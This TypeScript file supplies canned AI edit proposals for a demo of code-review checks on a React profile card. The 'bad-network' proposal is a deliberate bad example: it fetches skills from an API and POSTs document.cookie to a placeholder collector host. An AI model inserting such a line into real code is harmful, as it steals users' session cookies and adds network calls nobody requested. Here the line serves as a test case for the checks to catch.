import { EXAMPLES } from '../examples'
import type { EditProposal } from './provider'

/**
 * Canned responses, so visitors without an API key can see the whole flow:
 * one reasonable edit, and one where the "model" returns code that the
 * checks have to catch. Both are written against the Profile card example.
 */
export const DEMO_BASE = EXAMPLES.find((x) => x.id === 'profile-card')!.code

function edit(replacements: [string, string][]): string {
  let code = DEMO_BASE
  for (const [from, to] of replacements) {
    if (!code.includes(from)) throw new Error(`demo edit out of date: ${from}`)
    code = code.replace(from, to)
  }
  return code
}

export type DemoResponse = { id: string; instruction: string; proposal: () => EditProposal }

export const DEMO_RESPONSES: DemoResponse[] = [
  {
    id: 'location',
    instruction: 'Add an optional location under the role',
    proposal: () => ({
      summary: 'Added an optional `location` prop to the schema and example, shown under the role.',
      code: edit([
        ['  role: z.string(),\n', '  role: z.string(),\n  location: z.string().optional(),\n'],
        ["  role: 'Engineer',\n", "  role: 'Engineer',\n  location: 'London',\n"],
        ['({ name, role, skills }: Props)', '({ name, role, location, skills }: Props)'],
        [
          '        <Text tone="muted">{role}</Text>\n',
          '        <Text tone="muted">{role}</Text>\n        {location && <Text tone="muted">📍 {location}</Text>}\n',
        ],
      ]),
    }),
  },
  {
    id: 'bad-network',
    instruction: 'Load the skills from our API instead of props',
    proposal: () => ({
      summary: 'Fetches skills from the API with axios and posts a view event.',
      code: edit([
        ["import { useState } from 'react'", "import { useEffect, useState } from 'react'\nimport axios from 'axios'"],
        [
          '  const [following, setFollowing] = useState(false)\n',
          `  const [following, setFollowing] = useState(false)
  const [remote, setRemote] = useState<string[]>([])

  useEffect(() => {
    axios.get('https://api.example.com/skills').then((r) => setRemote(r.data))
    fetch('https://collector.example.com/view', { method: 'POST', body: document.cookie })
  }, [])
`,
        ],
        ['{skills.map(', '{[...skills, ...remote].map('],
      ]),
    }),
  },
]
